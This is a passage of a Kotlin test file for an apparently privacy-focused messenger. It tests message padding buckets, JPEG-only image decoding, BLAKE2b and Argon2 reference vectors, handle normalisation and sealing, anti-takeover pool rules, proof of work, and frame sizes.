        val long = Envelope.text("é".repeat(MessagePolicy.MAX_CHARS), 0).encodePadded().size
        assertEquals(Envelope.TEXT_BUCKET, short); assertEquals(short, long)
        val g = Envelope(Envelope.Kind.GROUP_TEXT, Bytes.random(16), 0, Groups.Text(Bytes.random(16), "hi").encode()).encodePadded().size
        assertEquals(Envelope.TEXT_BUCKET, g)
        val jpeg = byteArrayOf(0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte()) + Bytes.random(500)
        val small = Envelope(Envelope.Kind.IMAGE, Bytes.random(16), 0, Media.Image(null, "", jpeg).encode()).encodePadded()
        val big = Envelope(Envelope.Kind.IMAGE, Bytes.random(16), 0, Media.Image(null, "cap", jpeg + Bytes.random(Media.MAX_JPEG - jpeg.size)).encode()).encodePadded()
        assertEquals(Envelope.IMAGE_BUCKET, small.size); assertEquals(Envelope.IMAGE_BUCKET, big.size)
        assertEquals(Envelope.Kind.IMAGE, Envelope.decodePadded(big).kind)
        // Control messages stay small.
        assertEquals(256, Envelope(Envelope.Kind.TIMER, Bytes.random(16), 0, ByteArray(4)).encodePadded().size)
    }

    @Test fun imageBodyRoundTripAndRejectsNonJpeg() {
        val jpeg = byteArrayOf(0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xDB.toByte()) + Bytes.random(100)
        val gid = Bytes.random(16)
        val d = Media.Image.decode(Media.Image(gid, "look", jpeg).encode())
        assertArrayEquals(gid, d.groupId!!); assertEquals("look", d.caption); assertArrayEquals(jpeg, d.jpeg)
        assertNull(Media.Image.decode(Media.Image(null, "", jpeg).encode()).groupId)
        val png = byteArrayOf(0x89.toByte(), 0x50, 0x4E, 0x47) + Bytes.random(100)
        assertFails<MalformedException> { Media.Image.decode(Media.Image(null, "", png).encode()) }
        assertFails<MalformedException> { Media.Image.decode(Media.Image(null, "", ByteArray(Media.MAX_JPEG + 1) { 0xFF.toByte() }).encode()) }
    }

    // ---------------------------------------------------------------- v1.5: BLAKE2b, Argon2, handles

    private fun unhex(h: String) = ByteArray(h.length / 2) { h.substring(it * 2, it * 2 + 2).toInt(16).toByte() }

    @Test fun blake2bMatchesReference() {
        val cases = listOf(
            ByteArray(0) to "786a02f742015903c6c6fd852552d272912f4740e15847618a86e217f71f5419d25e1031afee585313896444934eb04b903a685b1448b755d56f701afe9be2ce",
            "abc".toByteArray() to "ba80a53f981c4d0d6a2797b69f12f6e94c212f14685ac4b74b12bb6fdbffa2d17d87c5392aab792dc252d5de4533cc9518d38aa8dbf1925ab92386edd4009923",
            ByteArray(128) { it.toByte() } to "2319e3789c47e2daa5fe807f61bec2a1a6537fa03f19ff32e87eecbfd64b7e0e8ccff439ac333b040f19b0c4ddd11a61e24ac1fe0f10a039806c5dcc0da3d115",
            (ByteArray(256) { it.toByte() } + ByteArray(44) { it.toByte() }) to "d9cf5983dc6b34c0fa1f0226926855ad3eccd2bcdcd8f8053b9a80664d33b5afcc32fd21c70ea14f4ef50ca97c3203c4d1803159f0e01bb6cb1d1c83db52b63c")
        for ((m, h) in cases) assertEquals(h, Bytes.hex(Blake2b.hash(64, m)))
        // Split updates give the same answer as one.
        val m = ByteArray(300) { it.toByte() }
        assertEquals(cases[3].second, Bytes.hex(Blake2b(64).update(m, 0, 7).update(m, 7, 121).update(m, 128, 172).digest()))
        assertEquals("65676d800617972fbd87e4b9514e1c67402b7a331096d3bfac22f1abb95374abc942f16e9ab0ead33b87c91968a6e509e119ff07787b3ef483e1dcdccf6e3022",
            Bytes.hex(Blake2b(64, ByteArray(64) { it.toByte() }).update(ByteArray(64) { it.toByte() }).digest()))
        assertEquals("bddd813c634239723171ef3fee98579b94964e3bb1cb3e427262c8c068d52319", Bytes.hex(Blake2b.hash(32, "abc".toByteArray())))
    }

    @Test fun argon2MatchesRfc9106Vectors() {
        val p = ByteArray(32) { 1 }; val salt = ByteArray(16) { 2 }; val k = ByteArray(8) { 3 }; val x = ByteArray(12) { 4 }
        fun run(t: Argon2.Type) = Bytes.hex(Argon2.hash(t, p, salt, 3, 32, 4, 32, k, x))
        assertEquals("512b391b6f1162975371d30919734294f868e3be3984f3c1a13a4db9fabe4acb", run(Argon2.Type.D))
        assertEquals("c814d9d1dc7f37aa13f0d77f2494bda1c8de6b016dd388d29952a4c4672b6ce8", run(Argon2.Type.I))
        assertEquals("0d640df58d78766c08c037a34a8b53c9d01ef0452d75b65eb52520e96b01e659", run(Argon2.Type.ID))
    }

    @Test fun argon2idMatchesReferenceAtOnyxMemory() {
        // Reference implementation: $argon2id$v=19$m=65536,t=2,p=1$c29tZXNhbHQ$CTFhFdXPJO1aFaMaO6Mm5c8y7cJHAph8ArZWb2GRPPc
        assertEquals("09316115d5cf24ed5a15a31a3ba326e5cf32edc24702987c02b6566f61913cf7",
            Bytes.hex(Argon2.hash(Argon2.Type.ID, "password".toByteArray(), "somesalt".toByteArray(), 2, 65536, 1, 32)))
    }

    @Test fun handleNamesAreStrict() {
        assertEquals("raven.4821", Handles.normalize("  Raven.4821 "))
        assertEquals("raven_x.42", Handles.normalize("ＲＡＶＥＮ_x.42"))           // fullwidth folds to ASCII
        assertNull(Handles.normalize("raven"))                                      // no number
        assertNull(Handles.normalize("raven.7"))                                    // number too short
        assertNull(Handles.normalize("raven.042"))                                  // no leading zero
        assertNull(Handles.normalize("rаven.42"))                                   // Cyrillic a: look-alike
        assertNull(Handles.normalize("ra.42")); assertNull(Handles.normalize("a".repeat(21) + ".42"))
        repeat(200) {
            val h = Handles.withRandomSuffix("Raven")
            assertEquals(h, Handles.normalize(h))
            assertTrue(h.substringAfter('.').toInt() in Handles.SUFFIX_MIN..Handles.SUFFIX_MAX)
        }
        assertFails<IllegalArgumentException> { Handles.withRandomSuffix("no spaces") }
    }

    @Test fun handleRecordsSealOpenAndHideEverything() {
        val k1 = Handles.derive("raven.4821", memoryKiB = 1024)
        val k2 = Handles.derive("RAVEN.4821", memoryKiB = 1024)
        assertArrayEquals(k1.recordId, k2.recordId); assertArrayEquals(k1.key, k2.key)
        assertFalse(Bytes.ctEquals(k1.recordId, k1.key))
        val other = Handles.derive("raven.4822", memoryKiB = 1024)
        assertFalse(Bytes.ctEquals(k1.recordId, other.recordId))
        val card = Handles.Card("raven.4821", Bytes.random(32), Bytes.random(33), 20_500, Bytes.random(64))
        val sealed = Handles.seal(k1, card)
        assertEquals(Handles.SEALED_SIZE, sealed.size)
        assertEquals(Handles.SEALED_SIZE, Handles.seal(k1, Handles.Card("abc.10", Bytes.random(32), Bytes.random(33), 1, Bytes.random(64))).size)
        val opened = Handles.open(k1, "raven.4821", sealed)!!
        assertArrayEquals(card.inboxOnionPk, opened.inboxOnionPk); assertEquals(20_500L, opened.expiresDay)
        assertNull(Handles.open(other, "raven.4822", sealed))                      // wrong key
        val flipped = sealed.copyOf().also { it[40] = (it[40].toInt() xor 1).toByte() }
        assertNull(Handles.open(k1, "raven.4821", flipped))                        // tampered
        val e = Handles.Entry(k1.recordId, Bytes.random(33), 3, 20_500, sealed, Bytes.random(64), 12345)
        val d = Handles.Entry.decode(e.encode())
        assertArrayEquals(e.signedBytes(), d.signedBytes()); assertEquals(12345L, d.pow)
    }

    @Test fun poolRulesOnlyOwnerChangesAndHeldIdsWait() {
        val id = Bytes.random(32); val owner = Bytes.random(33); val thief = Bytes.random(33)
        val sealed = ByteArray(Handles.SEALED_SIZE)
        val bits = 8      // low difficulty for the test; the rule is the same
        fun entry(o: ByteArray, v: Long, exp: Long, s: ByteArray = sealed, pow: Boolean = true): Handles.Entry {
            val n = if (pow) Handles.solvePow(Handles.putChallenge(id, o, v), Handles.PUT_POW_BITS) else 0L
            return Handles.Entry(id, o, v, exp, s, ByteArray(64), n)
        }
        val ok: (Handles.Entry) -> Boolean = { true }
        val today = 20_000L
        assertTrue(Handles.decide(null, null, entry(owner, 1, today + 243), today, ok) is Handles.Decision.Store)
        assertEquals("proof of work", (Handles.decide(null, null, entry(owner, 1, today + 243, pow = false), today, ok) as Handles.Decision.Reject).reason)
        assertTrue(Handles.decide(null, null, entry(owner, 1, today + 243), today) { false } is Handles.Decision.Reject)
        assertTrue(Handles.decide(null, null, entry(owner, 1, today + 400), today, ok) is Handles.Decision.Reject)
        val live = entry(owner, 1, today + 100)
        assertEquals("taken", (Handles.decide(live, null, entry(thief, 9, today + 200), today, ok) as Handles.Decision.Reject).reason)
        assertEquals("stale", (Handles.decide(live, null, entry(owner, 1, today + 200), today, ok) as Handles.Decision.Reject).reason)
        assertTrue(Handles.decide(live, null, entry(owner, 2, today + 200), today, ok) is Handles.Decision.Store)
        val del = entry(owner, 2, today + 200, ByteArray(0))
        assertTrue(Handles.decide(live, null, del, today, ok) is Handles.Decision.Delete)
        // After a delete the id is held: an old signed copy can't be replayed, a stranger can't take it.
        val tomb = Handles.holdAfterDelete(del, today)
        assertEquals("stale", (Handles.decide(null, tomb, live, today, ok) as Handles.Decision.Reject).reason)
        assertEquals("held", (Handles.decide(null, tomb, entry(thief, 1, today + 200), today, ok) as Handles.Decision.Reject).reason)
        assertTrue(Handles.decide(null, tomb, entry(owner, 3, today + 200), today, ok) is Handles.Decision.Store)
        // Expired: held 30 days for its old owner (at a higher version), even before the sweep runs.
        val expired = entry(owner, 5, today - 1)
        assertEquals("held", (Handles.decide(expired, null, entry(thief, 1, today + 200), today, ok) as Handles.Decision.Reject).reason)
        assertEquals("stale", (Handles.decide(expired, null, entry(owner, 5, today + 200), today, ok) as Handles.Decision.Reject).reason)
        assertTrue(Handles.decide(expired, null, entry(owner, 6, today + 200), today, ok) is Handles.Decision.Store)
        val (kept, holds) = Handles.sweep(listOf(expired, live), emptyList(), today)
        assertEquals(1, kept.size); assertEquals(today - 1 + Handles.HOLD_DAYS, holds.single().untilDay)
        assertTrue(Handles.decide(null, holds.single(), entry(thief, 1, today + 200), today + 31, ok) is Handles.Decision.Store)
        assertTrue(Handles.sweep(emptyList(), holds, today + 30).second.isEmpty())
        assertEquals(bits, 8)
    }

    @Test fun requestProofOfWork() {
        val inbox = Bytes.random(32)
        val ch = Handles.powChallenge(inbox, 20_000, Bytes.sha256("request A".toByteArray()))
        val n = Handles.solvePow(ch, bits = 12)
        assertTrue(Handles.checkPow(ch, n, 12))
        // The same solution doesn't cover a different request to the same inbox on the same day.
        assertFalse(Handles.checkPow(Handles.powChallenge(inbox, 20_000, Bytes.sha256("request B".toByteArray())), n, 30))
    }

    @Test fun benchFramesFillEachWireSize() {
        for ((len, wire) in listOf(16_300 to 16_388, 65_400 to 65_540, 261_000 to 262_148)) {
            val bos = ByteArrayOutputStream()
            val f = Frame.Bench(Bytes.random(len))
            FrameCodec(ByteArrayInputStream(ByteArray(0)), bos).write(f)
            assertEquals(wire, bos.size())
            val back = FrameCodec(ByteArrayInputStream(bos.toByteArray()), ByteArrayOutputStream()).read() as Frame.Bench
            assertArrayEquals(f.digest(), back.digest())
        }
    }

    @Test fun imagesFitA64KiBFrameAndNextBucketsAreAccepted() {
        // A full-size image with the longest caption, plus generous Signal overhead, still travels as a 64 KiB frame.
        val jpeg = byteArrayOf(0xFF.toByte(), 0xD8.toByte(), 0xFF.toByte(), 0xE0.toByte()) + Bytes.random(Media.MAX_JPEG - 4)
        val padded = Envelope(Envelope.Kind.IMAGE, Bytes.random(16), 0, Media.Image(Bytes.random(16), "é".repeat(500), jpeg).encode()).encodePadded()
        assertEquals(Envelope.IMAGE_BUCKET, padded.size)
        val bos = ByteArrayOutputStream()
        FrameCodec(ByteArrayInputStream(ByteArray(0)), bos).write(Frame.Message(3, ByteArray(padded.size + 2_000)))
        assertEquals(65_536 + 4, bos.size())
        // A v1.5 frame (lean bucket) is understood by this version.
        for (b in Padding.FRAME_BUCKETS_NEXT) {
            val inner = byteArrayOf(Frame.T_ACK.toByte()) + ByteArray(16)
            val wire = ByteWriter(b + 4).u32(b.toLong()).raw(Padding.pad(inner, intArrayOf(b))).toByteArray()
            val f = runCatching { FrameCodec(ByteArrayInputStream(wire), ByteArrayOutputStream()).read() }
            assertTrue("bucket $b: ${f.exceptionOrNull()}", f.isSuccess)
        }
    }
}
